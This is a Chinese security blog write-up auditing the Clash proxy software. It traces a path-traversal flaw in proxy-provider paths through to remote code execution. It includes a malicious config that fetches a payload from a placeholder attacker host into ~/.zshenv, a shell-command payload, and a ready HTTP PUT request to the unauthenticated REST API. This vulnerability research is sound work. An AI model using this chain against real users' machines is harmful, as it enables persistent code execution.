# 流行代理软件Clash CSRF未授权配置重载致使RCE | _0xf4n9x_'s Blog
[](#0x00-关于Clash "0x00 关于Clash")0x00 关于Clash
--------------------------------------------

### [](#名词解释 "名词解释")名词解释

*   [Clash](https://github.com/Dreamacro/clash)
    
    一个使用Golang编写的，支持Shadowsocks(R)、VMess、Trojan、Snell、SOCKS5、HTTP(S)等多个代理协议的代理工具。
    
*   [ClashX](https://github.com/yichengchen/clashX)
    
    旨在提供一个简单轻量化的开源GUI代理客户端，编写于Swift，仅支持MacOS平台。
    
*   [Clash for Windows](https://github.com/Fndroid/clash_for_windows_pkg)（简称CFW，后面统一使用简称）
    
    编写于Electron的闭源GUI代理客户端，支持Windows/MacOS/Linux多个平台。
    

以上是目前最流行的三款Clash系列相关的软件，Clash和ClashX源代码都是开源的，CFW是闭源的，ClashX与CFW这两个GUI工具的核心依然是前者Clash，即Clash是ClashX与CFW的上游。

### [](#基本使用 "基本使用")基本使用

#### [](#Linux平台 "Linux平台")Linux平台

在Linux平台上，一般都是直接用go安装CLI的Clash进行使用。

```bash
$ go install github.com/Dreamacro/clash@latest
$ clash -v
Clash unknown version linux amd64 with go1.19.1 unknown time
```

为图使用方便，参考官方文档（[https://github.com/Dreamacro/clash/wiki/Running-Clash-as-a-service](https://github.com/Dreamacro/clash/wiki/Running-Clash-as-a-service)），将Clash通过systemd服务来管理运行，这里不过多赘述。

试着第一次运行它，可以发现它会自动创建目录和相关配置文件。

```bash
$ clash
INFO[0000] Can't find config, create a initial config file
INFO[0000] Can't find MMDB, start download
INFO[0003] Mixed(http+socks) proxy listening at: 127.0.0.1:7890
^C
$ ls ~/.config/clash/
cache.db  config.yaml  Country.mmdb
```

生成的默认配置显然是不能直接使用的。一般来说主配置文件的来源可能是自己在相应的提供商上买，也可以是去网上找其他人的分享。

```plaintext
body="自动抓取tg频道、订阅地址、公开互联网上的ss、ssr、vmess、trojan节点信息"
```

[![](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/free-proxies-on-fofa.png)
](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/free-proxies-on-fofa.png)

[![](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/proxypool.png)
](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/proxypool.png)

将其下载下来，放到指定位置，就可以使用了。

```bash
$ curl https://www.gwggwebsite.top/clash/config -o ~/.config/clash/config.yaml
$ head -n 20 ~/.config/clash/config.yaml




port: 7890


socks-port: 7891







allow-lan: false
mode: rule
log-level: info
external-controller: 127.0.0.1:9090
```

如果未将Clash配置为systemd服务，那么也可以直接命令行启动Clash。

```bash
$ clash                             
INFO[0000] Start initial provider sg                    
INFO[0000] Start initial provider au                    
INFO[0000] Start initial provider fr                    
INFO[0000] Start initial provider gb                    
INFO[0000] Start initial provider ca                    
INFO[0000] Start initial provider all                   
INFO[0000] Start initial provider de                    
INFO[0000] Start initial provider others                
INFO[0000] Start initial provider us                    
INFO[0000] Start initial provider ru                    
INFO[0000] Start initial provider ch                    
INFO[0000] Start initial provider cn                    
INFO[0000] Start initial provider jp                    
INFO[0000] Start initial provider nl                    
INFO[0000] Start initial compatible provider 选择国家       
INFO[0000] Start initial compatible provider 全局选择       
INFO[0000] HTTP proxy listening at: 127.0.0.1:7890      
INFO[0000] SOCKS proxy listening at: 127.0.0.1:7891     
INFO[0000] RESTful API listening at: 127.0.0.1:9090    
```

如上便是成功启动了Clash，与此同时，Clash配置目录还产生了一个目录以及一些`provider`配置文件。

```bash
$ ls .config/clash/{config.yaml,www*}               
.config/clash/config.yaml

.config/clash/www.gwggwebsite.top:
provider-au.yaml  provider-cn.yaml  provider-gb.yaml  provider-others.yaml  provider-us.yaml
provider-ca.yaml  provider-de.yaml  provider-jp.yaml  provider-ru.yaml      provider.yaml
provider-ch.yaml  provider-fr.yaml  provider-nl.yaml  provider-sg.yaml
```

通过如下测试，能确定Clash确实是成功工作的。

```bash
$ curl -x socks5://127.0.0.1:7891 ip.sb
152.70.74.66
$ curl cip.cc/152.70.74.66             
IP	: 152.70.74.66
地址	: 美国  美国

数据二	: 美国

数据三	: 美国加利福尼亚

URL	: http://www.cip.cc/152.70.74.66
```

#### [](#macOS平台 "macOS平台")macOS平台

在macOS上，一般都是使用有GUI的ClashX或CFW。以下为ClashX使用步骤，CFW的使用类似，不作过多说明。

[![](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/clashx-on-macos.png)
](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/clashx-on-macos.png)

ClashX初次运行会在`~/.config/clash/`目录产生一个名为config.yaml的主配置文件，文件内容如下。

```yaml












mixed-port: 7890

external-controller: 127.0.0.1:9090
allow-lan: false
mode: rule
log-level: warning

proxies:

proxy-groups:

rules:
  - DOMAIN-SUFFIX,google.com,DIRECT
  - DOMAIN-KEYWORD,google,DIRECT
  - DOMAIN,google.com,DIRECT
  - DOMAIN-SUFFIX,ad.com,REJECT
  - GEOIP,CN,DIRECT
  - MATCH,DIRECT
```

ClashX的使用也是基于一份配置文件，同样只需将可用的主配置文件放到`~/.config/clash/`目录下，之后就可以使用了。具体步骤就是点击右上角ClashX图标，依次选择「Config」-「Remote config」-「Manage」-「Add」，将远程链接填入Url栏中即可自动下载远程的配置文件到本地。

[![](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/remote-clashx-config.png)
](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/remote-clashx-config.png)

可以观察到一个现象，将远程配置文件下载到本地的同时，还在本地创建了一个目录，该目录存放的是各种不同地区的`provider`配置文件，与在Linux上观察的现象一样。

#### [](#Windows平台 "Windows平台")Windows平台

Windows用户大多都是使用CFW，由于都是图形化操作，在使用上与ClashX类似，不做过多说明。

### [](#使用Tips "使用Tips")使用Tips

Clash一个强大的功能就是能够管理不同的多种类型的代理协议，那么可以利用这一点方便在日常渗透的时候快速切换不同IP地址。只需在配置文件中使用负载均衡模式下，将`strategy`参数的值修改为`round-robin`即可，参考[issue#1062](https://github.com/Dreamacro/clash/issues/1062)。

```yaml


  - name: "load-balance"
    type: load-balance
    proxies:
      - ss1
      - ss2
      - vmess1
    url: 'http://www.gstatic.com/generate_204'
    interval: 300
    strategy: round-robin 
```

效果如下图所示，秒级别切换IP代理地址。

[![](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/fast-switch-proxy.png)
](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/fast-switch-proxy.png)

[](#0x01-历史漏洞 "0x01 历史漏洞")0x01 历史漏洞
-----------------------------------

### [](#CFW-XSS2RCE-2022-x2F-02-x2F-23 "CFW XSS2RCE - 2022/02/23")CFW XSS2RCE - 2022/02/23

> Clash For Windows是由Electron提供的。如果一个XSS有效载荷是以代理的名义，我们可以在受害者的电脑上远程执行任何JavaScript代码。
> 
> [![](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/cfw-issue-2710.png)
> ](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/cfw-issue-2710.png)

详见此issue：[\[Bug\]: Remote Code Execution/远程代码执行 #2710](https://github.com/Fndroid/clash_for_windows_pkg/issues/2710)。

### [](#CFW路径穿越致使parsers-JS-RCE-2023-x2F-01-x2F-13 "CFW路径穿越致使parsers JS RCE - 2023/01/13")CFW路径穿越致使parsers JS RCE - 2023/01/13

> Windows 上的 clash\_for\_windows 在 0.20.12 在订阅一个恶意链接时存在远程命令执行漏洞。因为对订阅文件中 rule-providers 的 path 的不安全处理导致 cfw-setting.yaml 会被覆盖，cfw-setting.yaml 中 parsers 的 js代码将会被执行。
> 
> [![](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/cfw-issue-3891.png)
> ](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/cfw-issue-3891.png)

详见此issue：[\[Bug\]: Remote Code Execution/远程代码执行 #3891](https://github.com/Fndroid/clash_for_windows_pkg/issues/3891)。

CFW开发于Electron。Electron是GitHub开发的一个使用JavaScript、HTML和CSS构建桌面应用程序的开源框架。它通过使用Node.js和Chromium的渲染引擎完成跨平台的桌面GUI应用程序的开发，因此Electron拥有直接执行Node.js代码的能力，并且内置了Chromium内核，通过一个XSS漏洞就有可能导致远程代码执行的危害。

CFW本身是支持Windows/Linux/macOS三个平台的，但从以上两个漏洞可以发现，由于CFW开发于Electron，变相的引入了一层攻击面，导致其使用风险过高，并且CFW源代码并未开源。一部分用户可能会转移去使用其他的Clash客户端软件，比如macOS用户可能会改用ClashX，Linux用户或许会直接使用Clash CLI工具。

[](#0x02-主配置文件 "0x02 主配置文件")0x02 主配置文件
--------------------------------------

在进行下一步工作之前，先来了解下主配置文件。如下是主配置文件的部分内容，为节省长度，已省略注释和部分重复字段。

```yaml
port: 7890
socks-port: 7891
allow-lan: false
mode: rule
log-level: info
external-controller: 127.0.0.1:9090

proxies:

proxy-groups:
  - name: 全局选择
    type: select
    proxies:
      - 选择国家
  - name: 选择国家
    type: select
    proxies:
      - 🇺🇸 美国

  - name: 🇺🇸 美国
    type: url-test
    url: 'http://www.gstatic.com/generate_204'
    interval: 300
    use:
      - us
proxy-providers:
  us:
    type: http
    url: "https://www.gwggwebsite.top/clash/proxies?c=US"
    path: www.gwggwebsite.top/provider-us.yaml
    health-check:
      enable: true
      interval: 600
      url: http://www.gstatic.com/generate_204
```

值得留意的是`proxy-providers`中的`path`字段的值为`www.gwggwebsite.top/provider-us.yaml`。

在前面的基本使用小节，演示了Linux与macOS平台上Clash的基本使用。根据观察到的现象，提到了创建了一个文件夹`www.gwggwebsite.top`，其中还有一些`provider`配置文件。

那么可以肯定的是`proxy-providers`中的`path`字段的值对应的是本地的相对路径。

[](#0x03-代码审计分析 "0x03 代码审计分析")0x03 代码审计分析
-----------------------------------------

现在已知的信息是，Clash和ClashX都会根据主配置文件中的`proxy-providers`的`path`参数值，下载`provider`配置文件至本地。而在CFW历史漏洞中也可以发现，CFW对订阅文件中`rule-providers`的`path`存在着不安全的处理，但由于CFW并未开源，我们无从得知CFW是怎么处理`rule-providers`的细节，不过通过对比`proxy-providers`和`rule-providers`的结构和内容，可以发现两者很相似。

```yaml
proxy-providers:
  us:
    type: http
    url: "https://www.gwggwebsite.top/clash/proxies?c=US"
    path: www.gwggwebsite.top/provider-us.yaml
    health-check:
      enable: true
      interval: 600
      url: http://www.gstatic.com/generate_204
```

```yaml
rule-providers:
  p:
    type: http
    behavior: domain
    url: "http://this.your.url/cfw-settings.yaml"
    path: ./cfw-settings.yaml
    interval: 86400
```

`type`、`url`、`path`三个键是完全对上了，所以怀疑这里的处理逻辑是差不多的。又因为ClashX和CFW的上游代码用的都是Clash，那么只需对Clash此处的功能点进行审计即可。

Clash配置的结构如下，位于`config/config.go`文件，着重留意`proxy-providers`，因为`path`存在于其中。

```yaml
type RawConfig struct {
	Port               int          `yaml:"port"`
	SocksPort          int          `yaml:"socks-port"`
	RedirPort          int          `yaml:"redir-port"`
	TProxyPort         int          `yaml:"tproxy-port"`
	MixedPort          int          `yaml:"mixed-port"`
	Authentication     []string     `yaml:"authentication"`
	AllowLan           bool         `yaml:"allow-lan"`
	BindAddress        string       `yaml:"bind-address"`
	Mode               T.TunnelMode `yaml:"mode"`
	LogLevel           log.LogLevel `yaml:"log-level"`
	IPv6               bool         `yaml:"ipv6"`
	ExternalController string       `yaml:"external-controller"`
	ExternalUI         string       `yaml:"external-ui"`
	Secret             string       `yaml:"secret"`
	Interface          string       `yaml:"interface-name"`
	RoutingMark        int          `yaml:"routing-mark"`
	Tunnels            []Tunnel     `yaml:"tunnels"`

	ProxyProvider map[string]map[string]any `yaml:"proxy-providers"`
	Hosts         map[string]string         `yaml:"hosts"`
	DNS           RawDNS                    `yaml:"dns"`
	Experimental  Experimental              `yaml:"experimental"`
	Profile       Profile                   `yaml:"profile"`
	Proxy         []map[string]any          `yaml:"proxies"`
	ProxyGroup    []map[string]any          `yaml:"proxy-groups"`
	Rule          []string                  `yaml:"rules"`
}
```

与`proxy-providers`相关的代码如下。

```go
func parseProxies(cfg *RawConfig) (proxies map[string]C.Proxy, providersMap map[string]providerTypes.ProxyProvider, err error) {
	proxies = make(map[string]C.Proxy)
	providersMap = make(map[string]providerTypes.ProxyProvider)
	proxyList := []string{}
	proxiesConfig := cfg.Proxy
	groupsConfig := cfg.ProxyGroup
	providersConfig := cfg.ProxyProvider

	

	
	for name, mapping := range providersConfig {
		if name == provider.ReservedName {
			return nil, nil, fmt.Errorf("can not defined a provider called `%s`", provider.ReservedName)
		}

		pd, err := provider.ParseProxyProvider(name, mapping)
		if err != nil {
			return nil, nil, fmt.Errorf("parse proxy provider %s error: %w", name, err)
		}

		providersMap[name] = pd
	}

	for _, provider := range providersMap {
		log.Infoln("Start initial provider %s", provider.Name())
		if err := provider.Initial(); err != nil {
			return nil, nil, fmt.Errorf("initial proxy provider %s error: %w", provider.Name(), err)
		}
	}

	

	return proxies, providersMap, nil
}
```

[![](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/config-parseProxies.png)
](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/config-parseProxies.png)

首先是创建了一个空map `providersMap`。

```go
providersMap = make(map[string]providerTypes.ProxyProvider)
```

`providerTypes.ProxyProvider`是一个接口。其中的`Provider`接口代码位置在其之上。

```go

type Provider interface {
	Name() string
	VehicleType() VehicleType
	Type() ProviderType
	Initial() error
	Update() error
}


type ProxyProvider interface {
	Provider
	Proxies() []constant.Proxy
	
	
	Touch()
	HealthCheck()
```

创建`providersMap`之后，中间的其他变量赋值先不管，直接来到解析和初始化`providers`相关代码。

### [](#parse-providers "parse providers")parse providers

先对第一个for循环语句解析providers的代码进行分析，跟进其中的`provider.ParseProxyProvider`，进入到`adapter/provider/parser.go`文件。其中的`proxyProviderSchema`结构体如下，着重关注`path`。

```go
type proxyProviderSchema struct {
	Type        string            `provider:"type"`
	Path        string            `provider:"path"`
	URL         string            `provider:"url,omitempty"`
	Interval    int               `provider:"interval,omitempty"`
	Filter      string            `provider:"filter,omitempty"`
	HealthCheck healthCheckSchema `provider:"health-check,omitempty"`
}
```

在`ParseProxyProvider`中，使用了`constant.Path.Resolve`对`Path`做了处理。

```golang
path := C.Path.Resolve(schema.Path)
```

[![](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/parse-ParseProxyProvider.png)
](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/parse-ParseProxyProvider.png)

那么进入到`contant/path.go`文件中，`Resolve`内容如下。

```golang

func (p *path) Resolve(path string) string {
	if !filepath.IsAbs(path) {
		return filepath.Join(p.HomeDir(), path)
	}

	return path
}
```

`p.HomeDir()`的值通过如下代码可以得知，就是`~/.config/clash`。

```go
const Name = "clash"


var Path = func() *path {
	homeDir, err := os.UserHomeDir()
	if err != nil {
		homeDir, _ = os.Getwd()
	}

	homeDir = P.Join(homeDir, ".config", Name)
	return &path{homeDir: homeDir, configFile: "config.yaml"}
}()
```

回到上面，`Resolve`会将`/Users/$USERNAME/.config/clash/`与主配置文件中`proxy-providers`的`path`参数值`www.gwggwebsite.top/provider-us.yaml`进行拼接，然后返回到`ParseProxyProvider`函数中的`path`变量，最后`path`变量的值为`/Users/$USERNAME/.config/clash/www.gwggwebsite.top/provider-us.yaml`，当然如果你是Linux系统，会略有所不同。

继续往下，判断`schema.Type`的值，如果是`http`，则将`schema.URL`和`path`传入到`NewHTTPVehicle`函数，在其中会返回一个`HTTPVehicle`结构体数据，然后赋值给`vehicle`。`schema.URL`的值对应的是主配置文件中`proxy-providers`的`url`参数值`https://www.gwggwebsite.top/clash/proxies?c=US`。

```go
path := C.Path.Resolve(schema.Path)

var vehicle types.Vehicle
switch schema.Type {
case "file":
	vehicle = NewFileVehicle(path)
case "http":
	vehicle = NewHTTPVehicle(schema.URL, path)
default:
	return nil, fmt.Errorf("%w: %s", errVehicleType, schema.Type)
}

interval := time.Duration(uint(schema.Interval)) * time.Second
filter := schema.Filter
return NewProxySetProvider(name, interval, filter, vehicle, hc)
```

然后调用`NewProxySetProvider`函数，进入到`NewProxySetProvider`函数中，最后返回`wrapper`。只需明白`wrapper`中包含provider的名称、远程URL `url`、本地路径`path`，更新时间间隔`interval`等信息。

```go
func NewProxySetProvider(name string, interval time.Duration, filter string, vehicle types.Vehicle, hc *HealthCheck) (*ProxySetProvider, error) {
	
	
  
	fetcher := newFetcher(name, interval, vehicle, proxiesParseAndFilter, onUpdate)
	pd.fetcher = fetcher

	wrapper := &ProxySetProvider{pd}
	runtime.SetFinalizer(wrapper, stopProxyProvider)
	return wrapper, nil
}
```

[![](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/provider-newFetcher.png)
](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/provider-newFetcher.png)

`wrapper`最终返回到`config/config.go`中作为`pd`变量的值。pd作为值赋给`providersMap["us"]`。

```go
pd, err := provider.ParseProxyProvider(name, mapping)
if err != nil {
	return nil, nil, fmt.Errorf("parse proxy provider %s error: %w", name, err)
}

providersMap[name] = pd
```

[![](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/clash-parse-debug.png)
](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/clash-parse-debug.png)

### [](#initial-providers "initial providers")initial providers

上面的for循环结束后，来到下面的for语句中，进行初始化`providersMap`中的各个`provider`，也就是上一个环节中的`pd`。

```go
for _, provider := range providersMap {
	log.Infoln("Start initial provider %s", provider.Name())
	if err := provider.Initial(); err != nil {
		return nil, nil, fmt.Errorf("initial proxy provider %s error: %w", provider.Name(), err)
	}
}
```

那么则直接跟进`provider.Initial()`，达到`adapter/provider/provider.go`文件中。

```go
func (pp *proxySetProvider) Initial() error {
	elm, err := pp.fetcher.Initial()
	if err != nil {
		return err
	}

	pp.onUpdate(elm)
	return nil
}
```

再进入到`pp.fetcher.Initial()`，发现存在`safeWrite`。

```go
if f.vehicle.Type() != types.File && !isLocal {
	if err := safeWrite(f.vehicle.Path(), buf); err != nil {
		return nil, err
	}
}
```

[![](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/fetcher-Initial.png)
](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/fetcher-Initial.png)

`safeWrite`函数实现如下。

```go
func safeWrite(path string, buf []byte) error {
	dir := filepath.Dir(path)

	if _, err := os.Stat(dir); os.IsNotExist(err) {
		if err := os.MkdirAll(dir, dirMode); err != nil {
			return err
		}
	}

	return os.WriteFile(path, buf, fileMode)
}
```

此处`path`参数的值就是第一阶段parse providers时的那个`path`参数，其值就是`/Users/$USERNAME/.config/clash/www.gwggwebsite.top/provider-us.yaml`。

### [](#小结 "小结")小结

根据以上parse和initial providers的一整个流程，可以发现`https://www.gwggwebsite.top/clash/proxies?c=US`的远程内容被下载到本地的`/Users/$USERNAME/.config/clash/www.gwggwebsite.top/provider-us.yaml`路径。

```yaml
proxy-providers:
  us:
    type: http
    url: "https://www.gwggwebsite.top/clash/proxies?c=US"
    path: www.gwggwebsite.top/provider-us.yaml
    health-check:
      enable: true
      interval: 600
      url: http://www.gstatic.com/generate_204
```

如下代码，对来自外部的`path`没有任何判断，不仅支持绝对的路径，而且在使用了`filepath.Join`拼接路径时，没有考虑路径穿越的问题。

```go

func ParseProxyProvider(name string, mapping map[string]any) (types.ProxyProvider, error) {
	

	path := C.Path.Resolve(schema.Path)
  
	
}
```

```go

func (p *path) Resolve(path string) string {
	if !filepath.IsAbs(path) {
		return filepath.Join(p.HomeDir(), path)
	}

	return path
}
```

在向本地`WriteFile`写文件时，也应该限制只可以将文件写入`/Users/$USERNAME/.config/clash/`目录之中。

```go

func safeWrite(path string, buf []byte) error {
	dir := filepath.Dir(path)

	if _, err := os.Stat(dir); os.IsNotExist(err) {
		if err := os.MkdirAll(dir, dirMode); err != nil {
			return err
		}
	}

	return os.WriteFile(path, buf, fileMode)
}
```

此处也就存在一个路径穿越漏洞，而且`path`参数的文件名和其文件内容是可控的，那么最终就导致任意位置任意文件写入，不过需要注意的是写入的文件内容需要符合yaml格式。

那将文件写入到哪儿，才能最大化利用这个漏洞呢？在Linux系统上可以写入`~/.bash_profile`、`~/.profile`、`~/.bashrc`这三个文件之中；在macOS中也可以写入到这三个文件中，除此之外，还可以写zsh相关的配置文件`~/.zshenv`；对于Windows系统，利用方式在历史漏洞章节已经提过了。下面给出一个示例的恶意主配置文件内容。

```yaml
mixed-port: 7890
allow-lan: false
mode: rule
log-level: warning
proxy-providers:
  provider1:
    type: http
    url: 'http://{{yourevilser}}/evil.yaml'
    interval: 3600
    path: ../../.zshenv
    healthcheck:
      enable: true
      interval: 600
      url: http://www.gstatic.com/generate_204
```

其中`evil.yaml`内容如下，由于Clash对格式做了检查，如果不符合yaml格式则会报错，所以此处不仅需要符合yaml格式，最好还要尽可能的符合shell格式，以防止在执行命令的过程中报错被受害者发觉，如下的`<<!`在shell中意味着多行注释。

```yaml
open /System/Applications/Calculator.app;rm -f ~/.zshenv;bash -c 'nohup sleep 10 2>&1 > /dev/null &' <<!:
  aaaaa: 11111

proxies:
  - {name: vP, server: n04.a00x.party, port: 18000, type: ssr, cipher: aes-256-cfb, password: AFX92CS, protocol: auth_aes128_sha1, obfs: http_simple, protocol-param: 232991:xSnSFv, obfs-param: download.windowsupdate.com, udp: true}

aaaaa: 2222
```

[](#0x04-RESTful-API "0x04 RESTful API")0x04 RESTful API
--------------------------------------------------------

但是可以发现，上面那种利用方式的局限性就在于，需要受害者手动去导入一个不可信的远程配置，这对于攻击者来说，未必是那么容易实现。那么有没有一种方式能让受害者自动导入一个不可信的远程配置呢？

根据Clash官方文档的介绍（[https://clash.gitbook.io/doc/restful-api](https://clash.gitbook.io/doc/restful-api)），Clash存在一套RESTful API可以用于控制自身，能获取Clash中的一些信息，同时也能控制Clash内部的配置。

在Clash的配置文件中加入`external-controller`字段，即可去访问。

```bash
$ grep external config.yaml && curl 127.0.0.1:9090
external-controller: 127.0.0.1:9090
{"hello":"clash"}


$ curl -s http://127.0.0.1:9090/configs | jq .
{
  "port": 7890,
  "socks-port": 7891,
  "redir-port": 0,
  "tproxy-port": 0,
  "mixed-port": 0,
  "authentication": [],
  "allow-lan": false,
  "bind-address": "*",
  "mode": "rule",
  "log-level": "info",
  "ipv6": false
}
```

并且根据官方的如下建议，建议当`external-controller`为`0.0.0.0`时，此时一定要加上`secret`进行鉴权。

> 如果不是为了特殊需求，请尽量不要把 API 暴露在 0.0.0.0，如果真的要这么做，一定要加上 secret 进行鉴权

[![](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/clash-on-internet.png)
](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/clash-on-internet.png)

上图是公网暴露的Clash，它们的`external-controller`均为`0.0.0.0`。

而官方给出的建议还造成了一点误解，当`external-controller`不为`0.0.0.0`时，鉴权是不是就变得无关紧要了呢？导致大部分人在大部分情况下，会将主配置文件中`external-controller`的值改为非`0.0.0.0`的值（例如`127.0.0.1`），`secret`则会直接留空。在实际中见到的主配置文件，里面确实都是没有`secret`的。

在鉴权这一问题上，CFW比Clash与ClashX做的要安全很多。CFW初次打开，如果`~/.config/clash/config.yaml`文件不存在，则会生成的一个默认主配置文件，在此配置中不仅会随机化`external-controller`的端口，而且还会使用一个36位长度的随机字符串作为`secret`的值，并且从外部更新得到的主配置不会影响原默认`external-controller`和`secret`的配置，无论何时都需要鉴权。所以CFW的RESTful API相对安全，使用CFW的的用户也相对安全。

继续查阅RESTful API接口，发现某个API可以重新加载配置文件，这里倒是引起了注意力。

[![](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/put-clash-configs.png)
](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/put-clash-configs.png)

对重新加载配置文件功能点进行白盒代码审计，首先先跟进`/configs`路由的代码。

[![](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/clash-updateConfigs.png)
](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/clash-updateConfigs.png)

关键代码`updateConfigs`函数的内容如下。

```go

func updateConfigs(w http.ResponseWriter, r *http.Request) {
	req := struct {
		Path    string `json:"path"`
		Payload string `json:"payload"`
	}{}
	if err := render.DecodeJSON(r.Body, &req); err != nil {
		render.Status(r, http.StatusBadRequest)
		render.JSON(w, r, ErrBadRequest)
		return
	}

	force := r.URL.Query().Get("force") == "true"
	var cfg *config.Config
	var err error

	if req.Payload != "" {
		cfg, err = executor.ParseWithBytes([]byte(req.Payload))
		if err != nil {
			render.Status(r, http.StatusBadRequest)
			render.JSON(w, r, newError(err.Error()))
			return
		}
	} else {
		if req.Path == "" {
			req.Path = constant.Path.Config()
		}
		if !filepath.IsAbs(req.Path) {
			render.Status(r, http.StatusBadRequest)
			render.JSON(w, r, newError("path is not a absolute path"))
			return
		}

		cfg, err = executor.ParseWithPath(req.Path)
		if err != nil {
			render.Status(r, http.StatusBadRequest)
			render.JSON(w, r, newError(err.Error()))
			return
		}
	}

	executor.ApplyConfig(cfg, force)
	render.NoContent(w, r)
}
```

当`payload`参数传入重载的配置文件内容不为空的时候，往下继续判断要指定重载的配置文件路径`path`参数是否为空，如果为空，则是默认值`~/.config/clash/config.yaml`。最后到`executor.ApplyConfig(cfg, force)`处理。

先跟进`executor.ParseWithBytes`，位于文件`hub/executor/executor.go` ，内容如下。

```go

func ParseWithBytes(buf []byte) (*config.Config, error) {
	return config.Parse(buf)
}
```

继续进入`config.Parse`，位于文件`config/config.go`，内容如下。

```go

func Parse(buf []byte) (*Config, error) {
	rawCfg, err := UnmarshalRawConfig(buf)
	if err != nil {
		return nil, err
	}

	return ParseRawConfig(rawCfg)
}
```

其中`UnmarshalRawConfig`函数是检查配置是否符合yaml格式。

```go
func UnmarshalRawConfig(buf []byte) (*RawConfig, error) {
	
	rawCfg := &RawConfig{
		AllowLan:       false,
		BindAddress:    "*",
		Mode:           T.Rule,
		Authentication: []string{},
		LogLevel:       log.INFO,
		Hosts:          map[string]string{},
		Rule:           []string{},
		Proxy:          []map[string]any{},
		ProxyGroup:     []map[string]any{},
		DNS: RawDNS{
			Enable:      false,
			UseHosts:    true,
			FakeIPRange: "198.18.0.1/16",
			FallbackFilter: RawFallbackFilter{
				GeoIP:     true,
				GeoIPCode: "CN",
				IPCIDR:    []string{},
			},
			DefaultNameserver: []string{
				"114.114.114.114",
				"8.8.8.8",
			},
		},
		Profile: Profile{
			StoreSelected: true,
		},
	}

	if err := yaml.Unmarshal(buf, rawCfg); err != nil {
		return nil, err
	}

	return rawCfg, nil
}
```

然后再进入到`ParseRawConfig`函数，其中发现`parseProxies`函数。

```go
func ParseRawConfig(rawCfg *RawConfig) (*Config, error) {
	config := &Config{}

	config.Experimental = &rawCfg.Experimental
	config.Profile = &rawCfg.Profile

	general, err := parseGeneral(rawCfg)
	if err != nil {
		return nil, err
	}
	config.General = general

	proxies, providers, err := parseProxies(rawCfg)
	if err != nil {
		return nil, err
	}
	config.Proxies = proxies
	config.Providers = providers

  
  

	return config, nil
}
```

在代码审计分析章节，就是从`parseProxies`函数着手分析，进而分析了parse和initial providers的完整流程，最后得出结论，存在路径穿越漏洞，最终导致任意位置任意文件写入。所以此处也应同样如此，不过不同的是，RESTful API方式无需受害者去手动导入一个恶意的主配置，只要能对Clash触发一个HTTP请求即可。

HTTP报文如下，同时本地提供一个9999端口的Web服务，对外提供evil.yaml文件。

```http
PUT /configs?force=true HTTP/1.1
Host: 127.0.0.1:9090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 326

{"payload":"mixed-port: 7890\nallow-lan: false\nmode: rule\nlog-level: warning\nproxy-providers:\n  provider1:\n    type: http\n    url: 'http://127.0.0.1:9999/evil.yaml'\n    interval: 3600\n    path: ../../.zshenv\n    healthcheck:\n      enable: true\n      interval: 600\n      url: http://www.gstatic.com/generate_204"}
```

[![](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/burp-put-configs.png)
](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/burp-put-configs.png)

观察HTTP日志可以发现，来自Clash的请求，请求evil.yaml文件，并将其写入至本地`../../.zshenv`路径。

[![](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/iterm2.png)
](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/iterm2.png)

当打开一个zsh终端，如下命令就会被执行。

```bash
open /System/Applications/Calculator.app;rm -f ~/.zshenv;bash -c 'nohup sleep 10 2>&1 > /dev/null &
```

[![](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/open-terminal-rce.png)
](https://0xf4n9x.github.io/img/post/clash-unauth-force-configs-csrf-rce/open-terminal-rce.png)

[](#0x05-CSRF2RCE "0x05 CSRF2RCE")0x05 CSRF2RCE
-----------------------------------------------

如上直接通过RESTful API的方式去触发Clash的漏洞，需要考虑的是，攻击者能够访问到受害者的Clash服务。换句话说，上述方式只有在当`external-controller`为`0.0.0.0`或攻击者能访问到的地址时，才可以实现。

当目标受害者的Clash配置中的`external-controller`为`127.0.0.1`时，攻击者不能直接访问到受害者Clash的RESTful API，也就直接无法实现攻击。

但是不过根据官方文档的说法，Clash的RESTful API支持CORS（跨域资源共享），这样就直接解锁了跨域的限制。

